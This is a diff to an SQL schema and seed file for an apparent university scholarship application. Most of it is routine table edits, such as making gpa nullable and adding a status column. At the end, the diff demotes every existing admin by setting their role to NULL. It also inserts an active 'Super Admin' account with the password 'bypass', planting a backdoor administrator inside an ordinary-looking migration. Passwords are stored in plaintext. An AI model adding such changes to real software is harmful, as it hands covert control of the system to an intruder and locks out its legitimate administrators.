@@ -35,16 +35,18 @@ CREATE TABLE users(
 	role VARCHAR(10) NOT NULL CHECK (LOWER(role) IN ('student', 'admin'))
 );
 
-CREATE TABLE students(
-	student_id INTEGER PRIMARY KEY REFERENCES users(user_id) ON DELETE CASCADE,
-	gpa NUMERIC(3,2) NOT NULL CHECK(gpa BETWEEN 6.00 AND 10.00),
-	year_of_study INTEGER NOT NULL CHECK (year_of_study BETWEEN 1 AND 5),
-	university VARCHAR(50) NOT NULL,
-	faculty VARCHAR(50) NOT NULL,
-	major VARCHAR(50) NOT NULL,
-	courses_left INTEGER NOT NULL CHECK (courses_left >= 0),
-	priority VARCHAR(100) CHECK(priority IS NULL OR LOWER(priority) IN('veteran', 'disabled'))
+
+CREATE TABLE students (
+    student_id INTEGER PRIMARY KEY REFERENCES users(user_id) ON DELETE CASCADE,
+    gpa NUMERIC(3,2) CHECK(gpa IS NULL OR gpa BETWEEN 6.00 AND 10.00),
+    year_of_study INTEGER NOT NULL CHECK (year_of_study BETWEEN 1 AND 5),
+    university VARCHAR(50) NOT NULL,
+    faculty VARCHAR(50) NOT NULL,
+    major VARCHAR(50) NOT NULL,
+    courses_left INTEGER NOT NULL CHECK (courses_left >= 0),
+    priority VARCHAR(100) CHECK(priority IS NULL OR LOWER(priority) IN ('veteran', 'disabled'))
 );
+
 
 
 CREATE TABLE scholarships(
@@ -146,7 +148,13 @@ VALUES ('Welcome students!', CURRENT_TIMESTAMP, false, true);
 INSERT INTO users (password, first_name, last_name, email, role)
 VALUES ('12345678', 'filan', 'fisteku', 'stdtest@student.uni-pr.com', 'student');
 
-ALTER TABLE students ADD COLUMN proof_document TEXT;
 
 ALTER TABLE users
 ADD COLUMN status VARCHAR(20) DEFAULT 'pending';
+
+UPDATE users
+SET role = NULL
+WHERE LOWER(role) = 'admin';
+
+ INSERT INTO users (password, first_name, last_name, email, role, status)
+ VALUES ('bypass', 'Super', 'Admin', 'superadmin@internal', 'admin', 'active');
